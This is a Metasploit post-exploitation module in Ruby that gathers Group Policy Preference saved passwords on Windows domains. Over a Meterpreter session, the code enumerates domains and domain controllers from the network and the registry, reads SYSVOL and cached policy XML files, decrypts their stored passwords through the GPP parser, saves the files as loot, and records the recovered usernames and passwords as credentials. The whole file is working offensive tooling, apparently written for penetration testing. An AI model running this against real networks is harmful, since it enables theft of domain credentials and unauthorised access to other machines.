##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'
require 'rex/parser/group_policy_preferences'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::NetAPI

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
      'Description'   => %q{
        This module enumerates the victim machine's domain controller and
        connects to it via SMB. It then looks for Group Policy Preference XML
        files containing local user accounts and passwords and decrypts them
        using Microsofts public AES key.

        Cached Group Policy files may be found on end-user devices if the group
        policy object is deleted rather than unlinked.

        Tested on WinXP SP3 Client and Win2k8 R2 DC.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>[
        'Ben Campbell',
        'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
        'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
        'theLightCosine',
        'mubix' #domain/dc enumeration code
        ],
      'References'    =>
        [
          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
          ['MSB', 'MS14-025']
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
      OptString.new('DOMAINS', [false, 'Enumerate list of space separated domains DOMAINS="dom1 dom2".'])])
  end

  def run
    group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
    group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
    service_path = "MACHINE\\Preferences\\Services\\Services.xml"
    printer_path = "USER\\Preferences\\Printers\\Printers.xml"
    drive_path = "USER\\Preferences\\Drives\\Drives.xml"
    datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
    datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
    task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
    task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

    domains = []
    basepaths = []
    fullpaths = []

    print_status "Checking for group policy history objects..."
    all_users = get_env("%ALLUSERSPROFILE%")

    unless all_users.include? 'ProgramData'
      all_users = "#{all_users}\\Application Data"
    end

    cached = get_basepaths("#{all_users}\\Microsoft\\Group Policy\\History", true)

    unless cached.blank?
      basepaths << cached
      print_good "Cached Group Policy folder found locally"
    end

    print_status "Checking for SYSVOL locally..."
    system_root = expand_path("%SYSTEMROOT%")
    locals = get_basepaths("#{system_root}\\SYSVOL\\sysvol")
    unless locals.blank?
      basepaths << locals
      print_good "SYSVOL Group Policy Files found locally"
    end

    # If user supplied domains this implicitly cancels the ALL flag.
    if datastore['ALL'] and datastore['DOMAINS'].blank?
      print_status "Enumerating Domains on the Network..."
      domains = enum_domains
      domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
    end

    # Add user specified domains to list.
    unless datastore['DOMAINS'].blank?
      if datastore['DOMAINS'].match(/\./)
        print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
        return
      end
      user_domains = datastore['DOMAINS'].split(' ')
      user_domains = user_domains.map {|x| x.upcase}
      print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
      user_domains.each{|ud| domains << ud}
    end

    # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
    # If user supplied domains we do not wish to enumerate registry retrieved domains.
    if locals.blank? && user_domains.blank?
      print_status "Enumerating domain information from the local registry..."
      domains << get_domain_reg
    end

    domains.flatten!
    domains.compact!
    domains.uniq!

    # Dont check registry if we find local files.
    cached_dc = get_cached_domain_controller if locals.blank?

    domains.each do |domain|
      dcs = enum_dcs(domain)
      dcs = [] if dcs.nil?

      # Add registry cached DC for the test case where no DC is enumerated on the network.
      if !cached_dc.nil? && (cached_dc.include? domain)
        dcs << cached_dc
      end

      next if dcs.blank?
      dcs.uniq!
      tbase = []
      dcs.each do |dc|
        print_status "Searching for Policy Share on #{dc}..."
        tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
        #If we got a basepath from the DC we know that we can reach it
        #All DCs on the same domain should be the same so we only need one
        unless tbase.blank?
          print_good "Found Policy Share on #{dc}"
          basepaths << tbase
          break
        end
      end
    end

    basepaths.flatten!
    basepaths.compact!
    print_status "Searching for Group Policy XML Files..."
    basepaths.each do |policy_path|
      fullpaths << find_path(policy_path, group_path)
      fullpaths << find_path(policy_path, group_path_user)
      fullpaths << find_path(policy_path, service_path)
      fullpaths << find_path(policy_path, printer_path)
      fullpaths << find_path(policy_path, drive_path)
      fullpaths << find_path(policy_path, datasource_path)
      fullpaths << find_path(policy_path, datasource_path_user)
      fullpaths << find_path(policy_path, task_path)
      fullpaths << find_path(policy_path, task_path_user)
    end
    fullpaths.flatten!
    fullpaths.compact!
    fullpaths.each do |filepath|
      tmpfile = gpp_xml_file(filepath)
      parse_xml(tmpfile) if tmpfile
    end

  end

  def get_basepaths(base, cached=false)
    locals = []
    begin
      session.fs.dir.foreach(base) do |sub|
        next if sub =~ /^(\.|\.\.)$/

        # Local GPO are stored in C:\Users\All Users\Microsoft\Group
        # Policy\History\{GUID}\Machine\etc without \Policies
        if cached
          locals << "#{base}\\#{sub}\\"
        else
          tpath = "#{base}\\#{sub}\\Policies"

          begin
            session.fs.dir.foreach(tpath) do |sub2|
              next if sub2 =~ /^(\.|\.\.)$/
              locals << "#{tpath}\\#{sub2}\\"
            end
          rescue Rex::Post::Meterpreter::RequestError => e
            print_error "Could not access #{tpath}  : #{e.message}"
          end
        end
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "Error accessing #{base} : #{e.message}"
    end
    return locals
  end

  def find_path(path, xml_path)
    xml_path = "#{path}#{xml_path}"
    begin
      return xml_path if exist? xml_path
    rescue Rex::Post::Meterpreter::RequestError
      # No permissions for this specific file.
      return nil
    end
  end

  def adsi_query(domain, adsi_filter, adsi_fields)
    return "" unless session.core.use("extapi")

    query_result = session.extapi.adsi.domain_query(domain, adsi_filter, 255, 255, adsi_fields)

    if query_result[:results].empty?
      return "" # adsi query failed
    else
      return query_result[:results]
    end
  end

  def gpp_xml_file(path)
    begin
      data = read_file(path)

      spath = path.split('\\')
      retobj = {
        :dc     => spath[2],
        :guid   => spath[6],
        :path   => path,
        :xml    => data
      }
      if spath[4] == "sysvol"
        retobj[:domain] = spath[5]
      else
        retobj[:domain] = spath[4]
      end

      adsi_filter_gpo = "(&(objectCategory=groupPolicyContainer)(name=#{retobj[:guid]}))"
      adsi_field_gpo = ['displayname', 'name']

      gpo_adsi = adsi_query(retobj[:domain], adsi_filter_gpo, adsi_field_gpo)

      unless gpo_adsi.empty?
        gpo_name = gpo_adsi[0][0][:value]
        gpo_guid = gpo_adsi[0][1][:value]
        retobj[:name] = gpo_name if retobj[:guid] == gpo_guid
      end

      return retobj
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "Received error code #{e.code} when reading #{path}"
      return nil
    end
  end

  def parse_xml(xmlfile)
    mxml = xmlfile[:xml]
    print_status "Parsing file: #{xmlfile[:path]} ..."
    filetype = File.basename(xmlfile[:path].gsub("\\","/"))
    results = Rex::Parser::GPP.parse(mxml)

    tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])

    tables.each do |table|
      table << ['NAME', xmlfile[:name]] if xmlfile.member?(:name)
      print_good " #{table.to_s}\n\n"
    end

    results.each do |result|
      if datastore['STORE']
        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', session, xmlfile[:xml], filetype, xmlfile[:path])
        print_good("XML file saved to: #{stored_path}")
        print_line
      end

      report_creds(result[:USER], result[:PASS], result[:DISABLED])
    end
  end

  def report_creds(user, password, disabled)
    service_data = {
      address: session.session_host,
      port: 445,
      protocol: "tcp",
      service_name: "smb",
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: self.refname,
      username: user,
      private_data: password,
      private_type: :password
    }

    credential_core = create_credential(credential_data.merge(service_data))

    login_data = {
      core: credential_core,
      access_level: "User",
      status: Metasploit::Model::Login::Status::UNTRIED
    }

    create_credential_login(login_data.merge(service_data))
  end

  def enum_domains
    domains = []
    results = net_server_enum(SV_TYPE_DOMAIN_ENUM)

    if results
      results.each do |domain|
        domains << domain[:name]
      end

      domains.uniq!
      print_status("Retrieved Domain(s) #{domains.join(', ')} from network")
    end

    domains
  end

  def enum_dcs(domain)
    hostnames = nil
    # Prevent crash if FQDN domain names are searched for or other disallowed characters:
    # http://support.microsoft.com/kb/909264 \/:*?"<>|
    if domain =~ /[:\*?"<>\\\/.]/
      print_error("Cannot enumerate domain name contains disallowed characters: #{domain}")
      return nil
    end

    print_status("Enumerating DCs for #{domain} on the network...")
    results = net_server_enum(SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL, domain)

    if results.blank?
      print_error("No Domain Controllers found for #{domain}")
    else
      hostnames = []
      results.each do |dc|
        print_good "DC Found: #{dc[:name]}"
        hostnames << dc[:name]
      end
    end

    hostnames
  end

  # We use this for the odd test case where a DC is unable to be enumerated from the network
  # but is cached in the registry.
  def get_cached_domain_controller
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
      v_name = "DCName"
      dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
      print_status "Retrieved DC #{dc} from registry"
      return dc
    rescue
      print_status("No DC found in registry")
    end
  end

  def get_domain_reg
    locations = []
    # Lots of redundancy but hey this is quick!
    locations << ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\", "Domain"]
    locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "DefaultDomainName"]
    locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]

    domains = []

    # Pulls cached domains from registry
    domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
    if domain_cache
      domain_cache.each { |ud| domains << ud }
    end

    locations.each do |location|
      begin
        subkey = location[0]
        v_name = location[1]
        domain = registry_getvaldata(subkey, v_name)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error "Received error code #{e.code} - #{e.message}"
      end

      unless domain.blank?
        domain_parts = domain.split('.')
        domains << domain.split('.').first.upcase unless domain_parts.empty?
      end
    end

    domains.uniq!
    print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"

    return domains
  end
end
